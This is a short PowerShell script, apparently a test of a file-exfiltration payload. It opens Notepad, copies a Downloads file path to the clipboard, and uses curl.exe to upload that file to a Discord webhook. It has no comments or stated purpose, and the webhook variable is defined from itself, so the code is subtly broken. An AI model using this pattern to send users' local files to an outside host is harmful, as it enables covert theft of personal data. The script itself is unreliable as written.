Start-Process 'C:\windows\system32\notepad.exe'

$wh = "https://discord.com/api/webhooks/$wh"
$path = "$env:USERPROFILE\Downloads\test.txt"

Set-Clipboard -Value "$path"

curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"$path`"" $wh
